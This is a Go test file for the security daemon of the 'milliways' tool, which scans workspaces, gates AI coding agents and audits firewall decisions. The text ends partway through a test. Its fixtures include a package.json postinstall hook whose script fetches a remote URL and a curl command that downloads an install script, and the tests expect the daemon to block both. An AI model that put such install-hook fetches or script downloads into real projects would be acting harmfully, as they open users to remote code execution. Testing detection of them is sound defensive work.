// Copyright 2024 The milliways Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package daemon

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mwigge/milliways/internal/daemon/observability"
	"github.com/mwigge/milliways/internal/daemon/runners"
	"github.com/mwigge/milliways/internal/pantry"
	"github.com/mwigge/milliways/internal/security"
	"github.com/mwigge/milliways/internal/security/adapters"
	"github.com/mwigge/milliways/internal/security/rulepacks"
	"github.com/mwigge/milliways/internal/security/rules"
)

func TestInstallSecurityShimsForServerRegistersClaudeCodexBroker(t *testing.T) {
	runners.SetBrokerPathProvider(nil)
	t.Cleanup(func() { runners.SetBrokerPathProvider(nil) })

	stateDir := t.TempDir()
	installSecurityShimsForServer(stateDir)

	wantDir := filepath.Join(stateDir, "security-shims")
	if got := runners.ClientEnforcementMetadata(runners.AgentIDClaude); got.BrokerPath != wantDir || got.Level != runners.EnforcementBrokered {
		t.Fatalf("claude enforcement = %#v, want broker path %q", got, wantDir)
	}
	if got := runners.ClientEnforcementMetadata(runners.AgentIDCodex); got.BrokerPath != wantDir || got.Level != runners.EnforcementBrokered {
		t.Fatalf("codex enforcement = %#v, want broker path %q", got, wantDir)
	}
	if _, err := os.Stat(filepath.Join(wantDir, "npm")); err != nil {
		t.Fatalf("expected generated npm shim: %v", err)
	}
}

func TestSecurityStartupScanPersistsWarningsForStatus(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "package.json"), `{
  "scripts": {"postinstall": "node setup.mjs"}
}`)
	writeSecurityMethodFile(t, filepath.Join(workspace, "setup.mjs"), `fetch("https://getsession.org/x")`)

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.securityStartupScan(enc, &Request{
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{"workspace": workspace}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.startup_scan returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if blocks, _ := result["blocks"].(float64); blocks < 1 {
		t.Fatalf("blocks = %v, want at least one block; response=%v", result["blocks"], result)
	}

	enc, buf = newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 2)})
	resp = decodeSecurityMethodResponse(t, buf.Bytes())
	result = resp["result"].(map[string]any)
	if posture, _ := result["posture"].(string); posture != "block" {
		t.Fatalf("posture = %q, want block; result=%v", posture, result)
	}
	if blocks, _ := result["blocks"].(float64); blocks < 1 {
		t.Fatalf("status blocks = %v, want at least one; result=%v", result["blocks"], result)
	}
	if completed, _ := result["startup_scan_completed"].(bool); !completed {
		t.Fatalf("startup_scan_completed = %v, want true; result=%v", result["startup_scan_completed"], result)
	}
	if required, _ := result["startup_scan_required"].(bool); required {
		t.Fatalf("startup_scan_required = %v, want false; result=%v", result["startup_scan_required"], result)
	}
}

func TestSecurityStartupScanPreservesStrictModeAndResolvesStaleWarnings(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	packageJSON := filepath.Join(workspace, "package.json")
	writeSecurityMethodFile(t, packageJSON, `{
  "scripts": {"postinstall": "node setup.mjs"}
}`)

	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
		t.Fatalf("SetWorkspaceStatus: %v", err)
	}
	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	if _, err := s.runStartupSecurityScan(context.Background(), workspace, false); err != nil {
		t.Fatalf("runStartupSecurityScan first: %v", err)
	}
	status, err := db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus first: %v", err)
	}
	if status.Mode != string(security.ModeStrict) {
		t.Fatalf("mode after startup scan = %q, want strict", status.Mode)
	}
	if len(status.Warnings) == 0 {
		t.Fatalf("warnings len = 0, want startup warning")
	}

	if err := os.Remove(packageJSON); err != nil {
		t.Fatalf("remove package.json: %v", err)
	}
	if _, err := s.runStartupSecurityScan(context.Background(), workspace, false); err != nil {
		t.Fatalf("runStartupSecurityScan second: %v", err)
	}
	status, err = db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus second: %v", err)
	}
	if status.Mode != string(security.ModeStrict) {
		t.Fatalf("mode after clean scan = %q, want strict", status.Mode)
	}
	if len(status.Warnings) != 0 {
		t.Fatalf("warnings after clean scan = %d, want 0: %#v", len(status.Warnings), status.Warnings)
	}
}

func TestStartupSecurityGateRunsRequiredScanAndPreservesStrictMode(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "package.json"), `{
  "scripts": {"postinstall": "node setup.mjs"}
}`)
	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
		t.Fatalf("SetWorkspaceStatus: %v", err)
	}

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	gotWorkspace, err := s.ensureStartupSecurityGate(context.Background(), "codex", workspace)
	if err != nil {
		t.Fatalf("ensureStartupSecurityGate: %v", err)
	}
	if gotWorkspace != workspace {
		t.Fatalf("workspace = %q, want %q", gotWorkspace, workspace)
	}
	status, err := db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus: %v", err)
	}
	if status.Mode != string(security.ModeStrict) {
		t.Fatalf("mode = %q, want strict", status.Mode)
	}
	if status.StartupScanCompletedAt.IsZero() {
		t.Fatalf("startup scan was not completed by gate")
	}
}

func TestStartupSecurityGateBlocksStrictBlockFindings(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "setup.mjs"), `fetch("https://getsession.org/x")`)
	if err := db.Security().SetWorkspaceStatus(workspace, string(security.ModeStrict), "codex"); err != nil {
		t.Fatalf("SetWorkspaceStatus: %v", err)
	}

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	_, err := s.ensureStartupSecurityGate(context.Background(), "codex", workspace)
	if err == nil || !strings.Contains(err.Error(), "blocked codex") {
		t.Fatalf("ensureStartupSecurityGate err = %v, want block", err)
	}
}

func TestAgentOpenWorkspaceUsesProjectSecurityWorkspace(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	daemonRoot := t.TempDir()
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", daemonRoot)
	writeSecurityMethodFile(t, filepath.Join(workspace, "package.json"), `{
  "scripts": {"postinstall": "node setup.mjs"}
}`)

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	s.agents = NewAgentRegistry(s)

	enc, buf := newCapturingEncoder()
	s.agentOpen(enc, &Request{
		ID: mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"agent_id":  "codex",
			"workspace": workspace,
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("agent.open returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	securityWorkspace, _ := result["security_workspace"].(string)
	if securityWorkspace != workspace {
		t.Fatalf("security_workspace = %q, want %q", securityWorkspace, workspace)
	}
	handle := AgentHandle(int64(result["handle"].(float64)))
	defer s.agents.Close(handle)
	sess, ok := s.agents.Get(handle)
	if !ok {
		t.Fatalf("session for handle %d not found", handle)
	}
	if sess.SecurityWorkspace != workspace {
		t.Fatalf("session SecurityWorkspace = %q, want %q", sess.SecurityWorkspace, workspace)
	}
	if tracked := s.agentSecurityWorkspace("codex"); tracked != workspace {
		t.Fatalf("tracked workspace = %q, want %q", tracked, workspace)
	}

	projectStatus, err := db.Security().SecurityStatus(workspace)
	if err != nil {
		t.Fatalf("SecurityStatus project: %v", err)
	}
	if projectStatus.StartupScanCompletedAt.IsZero() {
		t.Fatalf("project startup scan was not completed")
	}
	if _, ok, err := db.Security().GetClientProfile(workspace, "codex", clientProfileConfigHash(workspace, "codex")); err != nil {
		t.Fatalf("GetClientProfile project: %v", err)
	} else if !ok {
		t.Fatalf("project client profile was not recorded")
	}

	daemonStatus, err := db.Security().SecurityStatus(daemonRoot)
	if err != nil {
		t.Fatalf("SecurityStatus daemon root: %v", err)
	}
	if !daemonStatus.StartupScanCompletedAt.IsZero() {
		t.Fatalf("daemon cwd startup scan completed unexpectedly")
	}
	if _, ok, err := db.Security().GetClientProfile(daemonRoot, "codex", clientProfileConfigHash(daemonRoot, "codex")); err != nil {
		t.Fatalf("GetClientProfile daemon root: %v", err)
	} else if ok {
		t.Fatalf("daemon cwd client profile recorded unexpectedly")
	}
}

func TestSecurityStatusReportsStartupScanState(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 1)})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	result := resp["result"].(map[string]any)
	if completed, _ := result["startup_scan_completed"].(bool); completed {
		t.Fatalf("startup_scan_completed = true before scan; result=%v", result)
	}
	if required, _ := result["startup_scan_required"].(bool); !required {
		t.Fatalf("startup_scan_required = false before scan; result=%v", result)
	}
	if stale, _ := result["startup_scan_stale"].(bool); stale {
		t.Fatalf("startup_scan_stale = true before scan; result=%v", result)
	}

	currentHash := startupScanConfigHash(workspace)
	if err := db.Security().MarkStartupScanCompleted(workspace, currentHash); err != nil {
		t.Fatalf("MarkStartupScanCompleted current: %v", err)
	}
	enc, buf = newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 2)})
	resp = decodeSecurityMethodResponse(t, buf.Bytes())
	result = resp["result"].(map[string]any)
	if completed, _ := result["startup_scan_completed"].(bool); !completed {
		t.Fatalf("startup_scan_completed = false after scan; result=%v", result)
	}
	if required, _ := result["startup_scan_required"].(bool); required {
		t.Fatalf("startup_scan_required = true after current scan; result=%v", result)
	}
	if stale, _ := result["startup_scan_stale"].(bool); stale {
		t.Fatalf("startup_scan_stale = true after current scan; result=%v", result)
	}

	if err := db.Security().MarkStartupScanCompleted(workspace, "old-config"); err != nil {
		t.Fatalf("MarkStartupScanCompleted stale: %v", err)
	}
	enc, buf = newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 3)})
	resp = decodeSecurityMethodResponse(t, buf.Bytes())
	result = resp["result"].(map[string]any)
	if stale, _ := result["startup_scan_stale"].(bool); !stale {
		t.Fatalf("startup_scan_stale = false for old config; result=%v", result)
	}
	if required, _ := result["startup_scan_required"].(bool); !required {
		t.Fatalf("startup_scan_required = false for old config; result=%v", result)
	}
}

func TestSecurityStatusIncludesScannerAdapterStatus(t *testing.T) {
	oldAdapters := securityStatusAdapters
	securityStatusAdapters = func() []adapters.ScannerAdapter {
		return []adapters.ScannerAdapter{
			fakeSecurityStatusAdapter{name: "osv-scanner", installed: true, version: "osv-scanner 2.0.0"},
			fakeSecurityStatusAdapter{name: "gitleaks"},
			fakeSecurityStatusAdapter{name: "semgrep", installed: true, versionErr: errors.New("version failed")},
			fakeSecurityStatusAdapter{name: "govulncheck", installed: true, version: "govulncheck v1.1.4"},
		}
	}
	t.Cleanup(func() { securityStatusAdapters = oldAdapters })

	s := &Server{}
	enc, buf := newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 1)})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	result := resp["result"].(map[string]any)
	scanners, _ := result["scanners"].([]any)
	if len(scanners) != 4 {
		t.Fatalf("scanners len = %d, want 4; result=%v", len(scanners), result)
	}
	osv := scanners[0].(map[string]any)
	if osv["name"] != "osv-scanner" || osv["installed"] != true || osv["version"] != "osv-scanner 2.0.0" {
		t.Fatalf("osv scanner status = %#v", osv)
	}
	gitleaks := scanners[1].(map[string]any)
	if gitleaks["name"] != "gitleaks" || gitleaks["installed"] != false {
		t.Fatalf("gitleaks scanner status = %#v", gitleaks)
	}
	semgrep := scanners[2].(map[string]any)
	if semgrep["version_error"] == "" {
		t.Fatalf("semgrep version_error missing: %#v", semgrep)
	}
	if _, ok := gitleaks["version"]; ok {
		t.Fatalf("missing scanner should not report version: %#v", gitleaks)
	}
}

func TestSecurityStatusIncludesShimReadiness(t *testing.T) {
	stateDir := t.TempDir()
	s := &Server{socket: filepath.Join(stateDir, "sock")}
	installSecurityShimsForServer(stateDir)

	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 1)})
	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if errValue := resp["error"]; errValue != nil {
		t.Fatalf("security.status returned error: %v", errValue)
	}
	result, ok := resp["result"].(map[string]any)
	if !ok {
		t.Fatalf("result = %#v, want map", resp["result"])
	}
	raw, ok := result["shims"].(map[string]any)
	if !ok {
		t.Fatalf("shims = %#v, want map", result["shims"])
	}
	if raw["dir"] != filepath.Join(stateDir, "security-shims") {
		t.Fatalf("shim dir = %#v", raw["dir"])
	}
	if got, ok := raw["installed"].(float64); !ok || got == 0 {
		t.Fatalf("installed = %#v, want positive count", raw["installed"])
	}
}

func TestSecurityStatusIncludesCRAReadinessKPIs(t *testing.T) {
	oldAdapters := securityStatusAdapters
	securityStatusAdapters = func() []adapters.ScannerAdapter {
		return []adapters.ScannerAdapter{
			fakeSecurityStatusAdapter{name: "osv-scanner", installed: true, version: "osv-scanner 2.0.0"},
			fakeSecurityStatusAdapter{name: "gitleaks", installed: true, version: "gitleaks 8.0.0"},
		}
	}
	t.Cleanup(func() { securityStatusAdapters = oldAdapters })

	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "SECURITY.md"), "Report vulnerabilities to security@example.test. We respond within 7 days and coordinate disclosure.\n")
	writeSecurityMethodFile(t, filepath.Join(workspace, "sbom.spdx.json"), "{}\n")
	if err := db.Security().MarkStartupScanCompleted(workspace, startupScanConfigHash(workspace)); err != nil {
		t.Fatalf("MarkStartupScanCompleted: %v", err)
	}

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityStatus(enc, &Request{ID: mustSecurityMethodParams(t, 1)})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	result := resp["result"].(map[string]any)
	cra, ok := result["cra"].(map[string]any)
	if !ok {
		t.Fatalf("cra status missing or wrong type: %#v", result["cra"])
	}
	if score, _ := cra["evidence_score"].(float64); score <= 0 {
		t.Fatalf("cra evidence_score = %v, want positive; cra=%v", cra["evidence_score"], cra)
	}
	if present, _ := cra["reporting_present"].(float64); present != 3 {
		t.Fatalf("cra reporting_present = %v, want 3; cra=%v", cra["reporting_present"], cra)
	}
	if ready, _ := cra["reporting_ready"].(bool); !ready {
		t.Fatalf("cra reporting_ready = false, want true; cra=%v", cra)
	}
	if design, _ := cra["design_evidence_status"].(string); design != "present" {
		t.Fatalf("cra design_evidence_status = %q, want present; cra=%v", design, cra)
	}
	if deadline, _ := cra["reporting_deadline"].(string); deadline != "2026-09-11" {
		t.Fatalf("cra reporting_deadline = %q, want 2026-09-11; cra=%v", deadline, cra)
	}
	if next, _ := cra["next_action"].(string); next == "" {
		t.Fatalf("cra next_action missing; cra=%v", cra)
	}
}

func TestSecurityCRARPCReturnsSummaryAndChecks(t *testing.T) {
	oldAdapters := securityStatusAdapters
	securityStatusAdapters = func() []adapters.ScannerAdapter {
		return []adapters.ScannerAdapter{
			fakeSecurityStatusAdapter{name: "osv-scanner", installed: true, version: "osv-scanner 2.0.0"},
		}
	}
	t.Cleanup(func() { securityStatusAdapters = oldAdapters })

	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "SECURITY.md"), "Report vulnerabilities to security@example.test.\n")

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{Method: "security.cra", ID: mustSecurityMethodParams(t, 1)})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.cra returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	summary, ok := result["summary"].(map[string]any)
	if !ok {
		t.Fatalf("summary missing: %v", result)
	}
	if _, ok := summary["evidence_score"].(float64); !ok {
		t.Fatalf("summary evidence_score missing: %v", summary)
	}
	checks, _ := result["checks"].([]any)
	if len(checks) == 0 {
		t.Fatalf("checks empty: %v", result)
	}
	first := checks[0].(map[string]any)
	if first["id"] == "" || first["status"] == "" {
		t.Fatalf("check missing id/status: %#v", first)
	}
	for _, raw := range checks {
		check := raw.(map[string]any)
		if check["id"] != "cra-sbom" {
			continue
		}
		actions, _ := check["next_actions"].([]any)
		if len(actions) == 0 || !strings.Contains(actions[0].(string), "milliwaysctl security sbom") {
			t.Fatalf("cra-sbom next_actions missing SBOM command: %#v", check)
		}
		return
	}
	t.Fatalf("cra-sbom check missing: %v", checks)
}

func TestSecurityCRADoesNotTreatThinSecurityPolicyAsFullReportingEvidence(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "SECURITY.md"), "Security policy placeholder.\n")

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{Method: "security.cra", ID: mustSecurityMethodParams(t, 1)})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.cra returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	summary := result["summary"].(map[string]any)
	if present, _ := summary["reporting_present"].(float64); present != 1 {
		t.Fatalf("reporting_present = %v, want policy-only evidence; summary=%v", summary["reporting_present"], summary)
	}
	if ready, _ := summary["reporting_ready"].(bool); ready {
		t.Fatalf("reporting_ready = true for placeholder policy; summary=%v", summary)
	}
}

func TestSecurityCRAUsesSupportUntilEvidence(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)
	writeSecurityMethodFile(t, filepath.Join(workspace, "SUPPORT.md"), "Security support until: 2029-12-31\n")

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{Method: "security.cra", ID: mustSecurityMethodParams(t, 1)})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.cra returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	checks, _ := result["checks"].([]any)
	for _, raw := range checks {
		check := raw.(map[string]any)
		if check["id"] != "cra-support-period" {
			continue
		}
		if status, _ := check["status"].(string); status != "present" {
			t.Fatalf("support-period status = %q, want present; check=%v", status, check)
		}
		return
	}
	t.Fatalf("cra-support-period check missing: %v", checks)
}

func TestSecurityModeStoresWorkspaceMode(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	t.Setenv("MILLIWAYS_WORKSPACE_ROOT", workspace)

	s := &Server{pantryDB: db}
	enc, buf := newCapturingEncoder()
	s.securityMode(enc, &Request{
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{"mode": "strict"}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.mode returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if mode, _ := result["mode"].(string); mode != "strict" {
		t.Fatalf("mode = %q, want strict; result=%v", mode, result)
	}
}

func TestSecurityCommandCheckRPCUsesFirewall(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.command_check",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"command": "npm install left-pad",
			"cwd":     workspace,
			"mode":    "strict",
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.command_check returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if decision, _ := result["decision"].(string); decision != "block" {
		t.Fatalf("decision = %q, want block; result=%v", decision, result)
	}
	if mode, _ := result["mode"].(string); mode != "strict" {
		t.Fatalf("mode = %q, want strict; result=%v", mode, result)
	}
	if client, _ := result["client"].(string); client != "codex" {
		t.Fatalf("client = %q, want codex; result=%v", client, result)
	}
	categories, _ := result["risk_categories"].([]any)
	if len(categories) != 1 || categories[0] != "package-install" {
		t.Fatalf("risk_categories = %#v, want package-install; result=%v", categories, result)
	}
	decisions, err := db.Security().ListPolicyDecisions(workspace, 10)
	if err != nil {
		t.Fatalf("ListPolicyDecisions: %v", err)
	}
	if len(decisions) != 1 {
		t.Fatalf("policy decisions = %d, want 1", len(decisions))
	}
	if decisions[0].Command != "npm install left-pad" || decisions[0].Decision != "block" || decisions[0].Client != "codex" {
		t.Fatalf("command-check audit = %#v", decisions[0])
	}
}

func TestSecurityCommandCheckRPCQuotesArgvFallbackForAudit(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.command_check",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"argv":      []string{"bash", "-lc", "printf '%s\n' \"$HOME\""},
			"workspace": workspace,
			"cwd":       workspace,
			"mode":      "warn",
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.command_check returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	wantCommand := "bash -lc 'printf '\\''%s\n'\\'' \"$HOME\"'"
	if command, _ := result["command"].(string); command != wantCommand {
		t.Fatalf("command = %q, want %q; result=%v", command, wantCommand, result)
	}
	decisions, err := db.Security().ListPolicyDecisions(workspace, 10)
	if err != nil {
		t.Fatalf("ListPolicyDecisions: %v", err)
	}
	if len(decisions) != 1 || decisions[0].Command != wantCommand || !strings.Contains(decisions[0].ArgvJSON, "printf") {
		t.Fatalf("policy decisions = %#v, want quoted command and argv audit", decisions)
	}
}

func TestSecurityPolicyDecideRPCUsesFirewallAndAudits(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.policy_decide",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"operation_type":    "command",
			"command":           "npm install left-pad",
			"workspace":         workspace,
			"cwd":               workspace,
			"client":            "codex",
			"session":           "session-1",
			"mode":              "strict",
			"enforcement_level": "blocking",
			"env_summary": map[string]any{
				"PATH": "set",
			},
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.policy_decide returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if decision, _ := result["decision"].(string); decision != "block" {
		t.Fatalf("decision = %q, want block; result=%v", decision, result)
	}
	if mode, _ := result["mode"].(string); mode != "strict" {
		t.Fatalf("mode = %q, want strict; result=%v", mode, result)
	}
	if enforcement, _ := result["enforcement_level"].(string); enforcement != "blocking" {
		t.Fatalf("enforcement_level = %q, want blocking; result=%v", enforcement, result)
	}

	decisions, err := db.Security().ListPolicyDecisions(workspace, 10)
	if err != nil {
		t.Fatalf("ListPolicyDecisions: %v", err)
	}
	if len(decisions) != 1 {
		t.Fatalf("policy decisions = %d, want 1", len(decisions))
	}
	audit := decisions[0]
	if audit.SessionID != "session-1" || audit.Client != "codex" || audit.OperationType != "command" {
		t.Fatalf("audit identity = %#v", audit)
	}
	if audit.Decision != "block" || audit.Mode != "strict" || audit.EnforcementLevel != "blocking" {
		t.Fatalf("audit decision = %#v", audit)
	}
	if !strings.Contains(audit.RisksJSON, "package-install") {
		t.Fatalf("audit risks_json = %q, want package-install", audit.RisksJSON)
	}
	if !strings.Contains(audit.EnvSummaryJSON, "PATH") {
		t.Fatalf("audit env_summary_json = %q, want PATH", audit.EnvSummaryJSON)
	}

	enc, buf = newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.policy_audit",
		ID:     mustSecurityMethodParams(t, 2),
		Params: mustSecurityMethodParams(t, map[string]any{
			"workspace":  workspace,
			"session_id": "session-1",
			"client":     "codex",
			"limit":      5,
		}),
	})
	resp = decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.policy_audit returned error: %v", resp)
	}
	auditResult := resp["result"].(map[string]any)
	events, _ := auditResult["events"].([]any)
	if len(events) != 1 {
		t.Fatalf("audit events = %d, want 1; result=%v", len(events), auditResult)
	}
	event := events[0].(map[string]any)
	if event["decision"] != "block" || event["session_id"] != "session-1" || event["client"] != "codex" {
		t.Fatalf("audit event identity/decision = %#v", event)
	}
}

func TestSecurityPolicyAuditFiltersBeforeLimit(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()
	base := time.Date(2026, 5, 14, 12, 0, 0, 0, time.UTC)

	if err := db.Security().RecordPolicyDecision(pantry.SecurityPolicyDecision{
		CreatedAt:        base,
		Workspace:        workspace,
		SessionID:        "session-match",
		Client:           "codex",
		CWD:              workspace,
		OperationType:    "command",
		Command:          "npm install left-pad",
		Mode:             "strict",
		Decision:         "block",
		Reason:           "package install commands require safe package policy",
		Parsed:           true,
		EnforcementLevel: "blocking",
	}); err != nil {
		t.Fatalf("RecordPolicyDecision matching: %v", err)
	}
	for i := 1; i <= 150; i++ {
		if err := db.Security().RecordPolicyDecision(pantry.SecurityPolicyDecision{
			CreatedAt:        base.Add(time.Duration(i) * time.Second),
			Workspace:        workspace,
			SessionID:        "session-other",
			Client:           "codex",
			CWD:              workspace,
			OperationType:    "command",
			Command:          "echo newer",
			Mode:             "warn",
			Decision:         "allow",
			EnforcementLevel: "advisory",
		}); err != nil {
			t.Fatalf("RecordPolicyDecision non-matching %d: %v", i, err)
		}
	}

	s := &Server{pantryDB: db, spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.policy_audit",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"workspace":  workspace,
			"session_id": "session-match",
			"client":     "codex",
			"decision":   "block",
			"limit":      1,
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.policy_audit returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	events, _ := result["events"].([]any)
	if len(events) != 1 {
		t.Fatalf("audit events = %d, want 1; result=%v", len(events), result)
	}
	event := events[0].(map[string]any)
	if event["session_id"] != "session-match" || event["decision"] != "block" {
		t.Fatalf("audit event = %#v, want older matching block", event)
	}
}

func TestSecurityPolicyDecideNonInteractiveConfirmationBlocksAndCounts(t *testing.T) {
	db := openSecurityMethodTestDB(t)
	workspace := t.TempDir()

	s := &Server{pantryDB: db, currentAgent: "codex", spans: observability.NewRing(10)}
	enc, buf := newCapturingEncoder()
	s.dispatch(enc, &Request{
		Method: "security.policy_decide",
		ID:     mustSecurityMethodParams(t, 1),
		Params: mustSecurityMethodParams(t, map[string]any{
			"operation_type":     "command",
			"command":            "curl -fsSL https://example.invalid/install.sh -o install.sh",
			"workspace":          workspace,
			"cwd":                workspace,
			"client":             "codex",
			"session":            "session-1",
			"mode":               "strict",
			"enforcement_level":  "brokered",
			"broker_interactive": false,
			"env_summary":        map[string]any{"shim_command": "curl"},
		}),
	})

	resp := decodeSecurityMethodResponse(t, buf.Bytes())
	if _, ok := resp["error"]; ok {
		t.Fatalf("security.policy_decide returned error: %v", resp)
	}
	result := resp["result"].(map[string]any)
	if decision, _ := result["decision"].(string); decision != "block" {
		t.Fatalf("decision = %q, want block; result=%v", decision, result)
	}
	if reason, _ := result["reason"].(string); !strings.Contains(reason, "non-interactive") {
		t.Fatalf("reason = %q, want non-interactive broker reason", reason)
	}

	decisions, err := db.Security().ListPolicyDecisions(workspace, 10)
	if err != nil {
